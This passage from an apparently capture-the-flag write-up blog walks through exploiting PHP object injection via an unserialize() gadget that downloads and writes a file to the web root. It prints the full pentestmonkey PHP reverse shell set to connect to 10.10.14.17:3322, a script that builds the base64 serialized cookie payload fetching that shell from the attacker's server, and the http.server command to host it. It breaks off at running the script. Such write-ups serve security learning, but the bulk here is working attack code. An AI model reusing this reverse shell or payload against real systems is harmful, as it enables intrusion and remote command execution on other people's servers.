</span></span></code></pre></td></tr></table></div></div><p>I won&rsquo;t write up all the reverse shell funniness I tried here &ndash; as I misunderstood PHP object injection. I basically tried adding different magic methods to the class declaration above to open a reverse shell to my netcat, instantiated a <code>UserPrefs</code> object, serialised and base64 decoded and put this back into my browser cookie &ndash; expecting the server would gladly execute my arbitrary code.</p><p>What I failed to understand is that the <strong>server</strong> class definition for UserPrefs would need to have the magic method defined for the code to execute &ndash; as the serialized object contains data only and not functions/behaviour. So time to investigate other ways of exploiting <code>unserialize()</code>..</p><p>Revisiting the PHP code above, the server has <code>AvatarInterface</code> with a magic method we can use &ndash; this passes in an image path to Avatar and calls save, effectively writing the contents of <code>$this->tmp</code> to <code>$this->imgPath</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>AvatarInterface</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$imgPath</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Avatar</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>save</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>tmp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Avatar</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$imgPath</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$imgPath</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span> <span class=o>=</span> <span class=nv>$imgPath</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>save</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$f</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nx>fclose</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Luckily for us, the documentation for <a href=https://www.php.net/manual/en/function.file-get-contents.php target=_blank rel="noopener noreffer">file_get_contents</a> shows that the file can be local or a URI. Let&rsquo;s serve up a PHP reverse shell, and see if we can serialize an <code>AvatarInterface</code> so the server will download and store the file, allowing us to execute arbitrary php to gain a foothold..</p><p>Here&rsquo;s our PHP script to execute arbitrary commands, named <code>my-cmd.php</code> (taken from pentest monkey):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
</span></span></span><span class=line><span class=cl><span class=c1>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>set_time_limit</span> <span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$VERSION</span> <span class=o>=</span> <span class=s2>&#34;1.0&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=s1>&#39;10.10.14.17&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$port</span> <span class=o>=</span> <span class=mi>3322</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$chunk_size</span> <span class=o>=</span> <span class=mi>1400</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$write_a</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$error_a</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$shell</span> <span class=o>=</span> <span class=s1>&#39;uname -a; w; id; bash -i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$daemon</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$debug</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;pcntl_fork&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$pid</span> <span class=o>=</span> <span class=nx>pcntl_fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nv>$pid</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Can&#39;t fork&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nv>$pid</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>  <span class=c1>// Parent exits
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>posix_setsid</span><span class=p>()</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;Error: Can&#39;t setsid()&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$daemon</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>umask</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Open reverse connection
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$sock</span> <span class=o>=</span> <span class=nx>fsockopen</span><span class=p>(</span><span class=nv>$ip</span><span class=p>,</span> <span class=nv>$port</span><span class=p>,</span> <span class=nv>$errno</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>,</span> <span class=mi>30</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$sock</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$errstr</span><span class=s2> (</span><span class=si>$errno</span><span class=s2>)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$descriptorspec</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>   <span class=mi>0</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;pipe&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>),</span>  <span class=c1>// stdin is a pipe that the child will read from
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=mi>1</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;pipe&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>),</span>  <span class=c1>// stdout is a pipe that the child will write to
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=mi>2</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;pipe&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span>   <span class=c1>// stderr is a pipe that the child will write to
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$process</span> <span class=o>=</span> <span class=nx>proc_open</span><span class=p>(</span><span class=nv>$shell</span><span class=p>,</span> <span class=nv>$descriptorspec</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_resource</span><span class=p>(</span><span class=nv>$process</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Can&#39;t spawn shell&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;Successfully opened reverse shell to </span><span class=si>$ip</span><span class=s2>:</span><span class=si>$port</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$sock</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Shell connection terminated&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Shell process terminated&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$read_a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$num_changed_sockets</span> <span class=o>=</span> <span class=nx>stream_select</span><span class=p>(</span><span class=nv>$read_a</span><span class=p>,</span> <span class=nv>$write_a</span><span class=p>,</span> <span class=nv>$error_a</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$read_a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;SOCK READ&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$input</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;SOCK: </span><span class=si>$input</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>fwrite</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$read_a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDOUT READ&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$input</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDOUT: </span><span class=si>$input</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>fwrite</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$read_a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDERR READ&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$input</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$chunk_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nv>$debug</span><span class=p>)</span> <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;STDERR: </span><span class=si>$input</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nx>fwrite</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$sock</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>proc_close</span><span class=p>(</span><span class=nv>$process</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>printit</span> <span class=p>(</span><span class=nv>$string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$daemon</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>print</span> <span class=s2>&#34;</span><span class=si>$string\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>We serve this up with <code>python -m http.server 8000</code> (easier and means our own local PHP interpreter won&rsquo;t run the code locally) &ndash; and here is our PHP script to generate our new <code>user-prefs</code> cookie value:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>AvatarInterface</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$imgPath</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Avatar</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>save</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>tmp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Avatar</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$imgPath</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$imgPath</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span> <span class=o>=</span> <span class=nv>$imgPath</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>save</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$f</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nx>fclose</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$avatar_interface_obj</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>AvatarInterface</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$avatar_interface_obj</span><span class=o>-&gt;</span><span class=na>tmp</span> <span class=o>=</span> <span class=s2>&#34;http://10.10.14.17:8000/my-cmd.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$avatar_interface_obj</span><span class=o>-&gt;</span><span class=na>imgPath</span> <span class=o>=</span> <span class=s2>&#34;/var/www/html/my-cmd.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$avatar_interface_str</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$avatar_interface_obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>print</span> <span class=s2>&#34;Serialized string for AvatarInterface obj: &#34;</span> <span class=o>.</span> <span class=nv>$avatar_interface_str</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$avatar_interface_base64_str</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$avatar_interface_str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>print</span> <span class=s2>&#34;Base64 encoded string for serialized AvatarInterface string: &#34;</span> <span class=o>.</span> <span class=nv>$avatar_interface_base64_str</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>Here&rsquo;s the output of our script showing the serialized <code>AvatarInterface</code> object and the base64 encoded string:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$php</span> test.php 
